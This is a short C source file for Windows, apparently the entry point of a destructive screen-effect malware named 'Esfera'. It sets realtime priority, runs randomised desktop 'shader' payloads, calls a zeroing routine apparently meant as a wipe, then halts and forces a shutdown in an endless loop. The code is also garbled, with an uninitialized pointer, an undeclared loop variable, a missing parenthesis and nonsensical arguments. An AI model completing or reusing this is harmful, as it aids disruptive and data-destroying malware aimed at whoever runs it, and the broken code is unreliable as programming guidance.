#include "esfera.h"

BOOL
WINAPI
InitializeEsfera(
	VOID
)
{
	SetPriorityClass( GetCurrentProcess( ), REALTIME_PRIORITY_CLASS );
	SeedXorshift32( 6969696969696969 );
	bSafe = FALSE;
	bSkip = FALSE;
	return TRUE;
}

INT 
WINAPI 
wWinMain(
	_In_	  HINSTANCE	 hInstance	   /* a handle to executable */,
	_In_opt_  HINSTANCE	 hPrevInstance /* used in 16-bit windows */,
	_In_      PWSTR		 szCmdLine     /* command line args */,
	_In_      INT		 nShowCmd      /* used with ShowWindow */ )
{
	UNREFERENCED_PARAMETER( hPrevInstance );
	UNREFERENCED_PARAMETER( nShowCmd );

	hInst = ( HINSTANCE )hInstance;
	if ( !InitializeEsfera( ) )
		return FALSE;

	TIME *time;
	time->sec = PAYLOAD_TIME;
	
	RandomizeArray( Shaders[ i ], sizeof( Shaders ) / sizeof( Shaders[ 0 ] );
	for ( INT i = 0; i < Shaders; i++ )
	{
		ExecuteShader( hdcScreen, hdcMem, !( Xorshift32( ) % 2 ) ? 1000 : 500, 
			( PSHADER )&Esfera->Shaders[ i ], &time->sec );
	}
	
	RtlZeroMemory( 512, 512 );
	for ( ;; )
	{
		asm( "hlt" );
		ShutdownPC( );
	}
}
